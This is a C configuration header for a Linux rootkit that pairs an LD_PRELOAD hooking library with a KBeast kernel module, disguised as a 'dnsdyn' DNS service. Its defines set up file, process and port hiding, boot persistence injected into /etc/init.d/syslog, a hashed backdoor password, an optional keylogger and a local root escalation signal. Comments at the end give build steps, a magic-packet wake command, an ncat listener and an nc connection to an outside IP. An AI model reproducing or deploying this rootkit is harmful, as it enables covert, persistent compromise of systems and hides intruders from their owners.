#ifndef CONFIG_H
#define CONFIG_H

#define MAGIC_DIR "dnsdyn"
#define MAGIC_GID 188
#define MAGIC_UID 74
#define CONFIG_FILE "ld.so.preload"
#define CONFIG_FULLPATH "/etc/ld.so.preload"
#define CONFIG_CODE "/ld_poison.so\n"
#define APP_NAME "dnsdynm"


#define MAGIC_ACK 0x10e10488
#define MAGIC_SEQ 0xf363f879
#define MAGIC_REBOOT "/etc/init.d/syslog"
#define MAGIC_REBOOT_CODE "        insmod /usr/sbin/dnsdyn/dnsmodule.ko > /dev/null 2>&1\n        su root -c /usr/sbin/dnsdyn/dnsdynm\n"

/*
_password_ is the md5(_SALT_+md5(your_type_in_password));
*/
#define _RPASSWORD_ "a7ae32a7f77b0838b977fcb6c7cca236"
#define _ACK_PWD_		"_xstate"
#define _SALT_ "ooxx"
#define SALT_LENGTH 4

/*Don't change this line*/
#define TRUE 1
#define FALSE 0
#define MAGIC_TO_DO "tty"
#define INFO_GID 248
//define when execve what kind of command then the preload hooks begin



/*Start hidden module define*/
/*
Enable keylog probably makes the system unstable
But worth to be tried
*/
//#define _KEYLOG_
#define MAGIC_READ

/*Define your module & network daemon name*/
#define KBEAST "dnsmodule"

/*
All files, dirs, process will be hidden
Protected from deletion & being killed
*/
#define _H4X0R_ "dnsdyn"

/*
Directory where your rootkit will be saved
You have to use _H4X0R_ in your directory name
No slash (/) at the end
*/
#define _H4X_PATH_ "/usr/sbin/dnsdyn"

/*
File to save key logged data
*/
#define _LOGFILE_ "accdnslog"

/*
the daemon run as :
*/
#define _MAGIC_NAME_ "root"

/*
This port will be hidded from netstat
*/
#define _HIDE_PORT_ 58461
#define _MAGIC_PORT_ 65522
/*
Magic signal & pid for local escalation
*/
#define _MAGIC_SIG_ 38 //kill signal
#define _MAGIC_PID_ 27854 //kill this pid

//#define DEBUG
//#define DEBUG_IP

#endif


//echo ""> /etc/ld.so.preload
//echo /mnt/hgfs/work_virtual/JynKbeast/ld_poison.so > /etc/ld.so.preload 
//echo /ld_poison.so > /etc/ld.so.preload
//echo /mnt/hgfs/work_virtual/JynKbeast/ld_poison_debug.so > /etc/ld.so.preload 
//gcc -Wall -fPIC -shared -ldl ld_poison.c -o ld_poison_debug.so
//gcc -Wall -fPIC -shared -ldl ld_poison.c -o ld_poison.so
//wake use :nping --tcp -p 80 192.168.1.202 -g 58461 --seq 0xf363f879 --ack 0x10e10488 -N -c 1 
//listen use:ncat --ssl -v -l -p 58461 -k 
//nc -p 65522 202.113.13.169 3306
